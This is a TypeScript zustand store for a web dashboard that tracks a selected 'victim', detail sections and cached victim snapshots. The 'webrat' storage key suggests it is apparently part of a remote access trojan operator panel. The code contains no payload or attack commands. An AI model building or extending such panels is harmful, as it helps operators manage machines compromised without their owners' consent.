"use client";

import { create } from "zustand";

import type { Victim } from "../../api/victims";
import type { DetailSectionKey } from "../state/detail-section";

type State = {
    isOpen: boolean;
    section: DetailSectionKey;
    selectedVictimId: string | null;
    victimSnapshots: Record<string, Victim>;
};

type Actions = {
    setSection: (next: DetailSectionKey) => void;
    selectVictim: (victimId: string) => void;
    openDetailForVictim: (victimId: string) => void;
    closeDetailView: () => void;
    rememberVictimSnapshot: (victim: Victim) => void;
};

const STORAGE_KEY = "webrat_selected_victim";

function readSelectedVictimId(): string | null {
    try {
        if (typeof window === "undefined") return null;
        const fromStorage = sessionStorage.getItem(STORAGE_KEY);
        return fromStorage ? String(fromStorage) : null;
    } catch {
        return null;
    }
}

function writeSelectedVictimId(victimId: string) {
    try {
        if (typeof window === "undefined") return;
        sessionStorage.setItem(STORAGE_KEY, victimId);
    } catch {
    }
}

function clearSelectedVictimId() {
    try {
        if (typeof window === "undefined") return;
        sessionStorage.removeItem(STORAGE_KEY);
    } catch {
    }
}

export const usePanelDetailViewStore = create<State & Actions>()((set, get) => ({
    isOpen: false,
    section: "information",
    selectedVictimId: readSelectedVictimId(),
    victimSnapshots: {},

    setSection: (next: DetailSectionKey) => set({ section: next }),

    selectVictim: (victimId: string) => {
        const id = String(victimId || "").trim();
        if (!id) return;
        console.log("[store] selectVictim called:", { input: victimId, cleaned: id });
        set({ selectedVictimId: id });
        writeSelectedVictimId(id);
    },

    openDetailForVictim: (victimId: string) => {
        const id = String(victimId || "").trim();
        if (!id) return;
        get().selectVictim(id);
        set({ section: "information", isOpen: true });
    },

    closeDetailView: () => {
        set({ isOpen: false, section: "information", selectedVictimId: null });
        clearSelectedVictimId();
    },

    rememberVictimSnapshot: (victim: Victim) => {
        const id = String((victim as { id?: unknown }).id ?? "").trim();
        if (!id) return;

        set((prev: State & Actions) => {
            const next: Record<string, Victim> = { ...prev.victimSnapshots, [id]: victim };
            const keys = Object.keys(next);
            if (keys.length > 200) {
                delete next[keys[0]];
            }
            return { victimSnapshots: next };
        });
    },
}));
